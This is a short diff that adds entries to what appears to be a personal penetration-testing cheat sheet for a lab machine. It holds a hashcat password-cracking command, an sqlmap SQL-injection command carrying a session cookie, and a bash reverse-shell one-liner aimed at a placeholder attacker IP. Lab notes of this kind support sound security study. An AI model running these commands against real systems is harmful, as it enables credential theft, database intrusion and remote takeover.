@@ -66,3 +66,10 @@
 
 ### Hashcat
  - `hashcat -a 0 -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt`
+
+### sqlmap
+ - `sqlmap -u "http://10.129.29.21/dashboard.php?search=%27" --cookie="PHPSESSID=f0mn05nbrdadh5164gavl9q4un"`
+
+### bash
+ - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`, reverse shell.
+ - `sudo -l` check sudo permissions.
